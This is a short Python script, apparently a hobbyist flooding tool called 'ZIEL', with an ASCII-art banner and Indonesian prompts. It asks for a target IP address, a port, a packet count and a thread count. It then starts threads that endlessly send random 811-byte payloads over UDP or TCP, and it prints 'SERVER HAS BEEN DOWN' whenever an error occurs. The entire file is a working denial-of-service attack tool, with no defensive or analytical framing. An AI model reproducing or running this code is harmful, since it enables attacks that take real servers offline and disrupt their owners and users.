#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("\035[1;32;40m ▒███████▒ ██▓▓█████  ██▓     ")
print("\035[1;32;40m ▒ ▒ ▒ ▄▀░▓██▒▓█   ▀ ▓██▒      ")
print("\035[1;32;40m ░ ▒ ▄▀▒░ ▒██▒▒███   ▒██░      ")
print("\035[1;32;40m   ▄▀▒   ░░██░▒▓█  ▄ ▒██░      ")
print("\035[1;32;40m ▒███████▒░██░░▒████▒░██████▒")
print("\035[1;32;40m ░▒▒ ▓░▒░▒░▓  ░░ ▒░ ░░ ▒░▓  ░  ")
print("\035[1;32;40m ░░▒ ▒ ░ ▒ ▒ ░ ░ ░  ░░ ░ ▒  ░   ")
print("\035[1;32;40m ░ ░ ░ ░ ░ ▒ ░   ░     ░ ░       ")
print("\035[1;32;40m   ░ ░     ░     ░  ░    ░  ░    ")
print("\035[1;32;40m ░                                ")                

print("\033[94m")
ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" YANG BENER? (y/n) : "))
times = int(input(" NUKLIR : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(811)
	i = random.choice(("[$]","[•]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" WARNING!! NUKLIR FROM ZIEL!!!")
		except:
			print("[×] SERVER HAS BEEN DOWN!!!")

def run2():
	data = random._urandom(811)
	i = random.choice(("[!]","[^]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" WARNING!! NUKLIR FROM ZIEL!!!")
		except:
			s.close()
			print("[×] SERVER HAS BEEN DOWN!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
